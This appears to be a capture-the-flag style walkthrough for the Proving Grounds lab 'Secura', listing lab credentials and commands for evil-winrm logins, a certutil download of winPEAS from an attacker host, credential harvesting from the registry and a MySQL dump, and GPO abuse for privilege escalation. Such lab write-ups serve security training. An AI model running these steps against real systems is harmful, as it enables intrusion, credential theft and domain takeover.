---
title: Secura
date: 2026-07-13T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - Active-Directory
  - venv
  - evilwinrm
  - mysql
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Secura"
---

## X.X.X.95

Use the credentials given to evil-winrm into the x.x.x.95 machine. 

Eric.Wallows  
EricLikesRunning800

evil-winrm -i 192.168.177.95 -u Eric.Wallows -p EricLikesRunning800

![](Screenshot%202026-07-13%20at%2016.21.28.png)

Upload winpeas:

![](Screenshot%202026-07-13%20at%2016.25.21.png)

certutil -f -urlcache http://192.168.45.185/winPEASx86.exe winPEASx86.exe

![](Screenshot%202026-07-13%20at%2016.26.11.png)

![](Screenshot%202026-07-13%20at%2019.04.45.png)

Strangely, this was specifically from the winPEASany.exe not winPEASsx86.exe. 

Or:  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

![](Screenshot%202026-07-13%20at%2017.10.09.png)

Or:    
RDCManFile: C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings

![](Screenshot%202026-07-13%20at%2017.11.16.png)

apache  
New2Era4.!

Use the administrator account and evil-winrm to get the flags....

## X.X.X.96

Login as apache:   
evil-winrm -i 192.168.177.96 -u apache -p New2Era4.!

![](Screenshot%202026-07-14%20at%2015.43.48.png)

MySQL has a root user with no password. 

![](Screenshot%202026-07-14%20at%2015.48.28.png)


![](Screenshot%202026-07-14%20at%2015.57.38.png)

.\mysqldump.exe -u root --all-databases > dump.sql

Within that dump, just at the start you'll find a 'creds' table.

![](Screenshot%202026-07-14%20at%2016.35.01.png)

administrator  
Almost4There8.?

charlotte  
Game2On4.!

![](Screenshot%202026-07-14%20at%2016.41.42.png)


## X.X.X.97

Bloodhound:

bloodhound-python -u "Eric.Wallows" -p 'EricLikesRunning800' -d secura.yzx -c all --zip -ns 192.168.137.97

Start bloodhound, upload the zip file. 

Use the Pathfinding option find a way to escalate privs.

![](Screenshot%202026-07-13%20at%2016.11.32.png)

![](Screenshot%202026-07-13%20at%2016.10.58.png)

![](Screenshot%202026-07-13%20at%2016.10.28.png)

CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=SECURA,DC=YZX

git clone https://github.com/Hackndo/pyGPOAbuse.git

python -m venv .venv  
source .venv/bin/activate  

pip3 install -r requirements.txt

python pygpoabuse.py secura.yzx/charlotte:Game2On4.! -dc-ip 192.168.177.97 -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command "net localgroup administrators charlotte /add"

![](Screenshot%202026-07-13%20at%2016.08.45.png)

Sign out, wait for Active directory to update, I waited around 5 mins. Sign back in. 

evil-winrm -i 192.168.177.97 -u "charlotte"

![](Screenshot%202026-07-13%20at%2016.14.29.png)
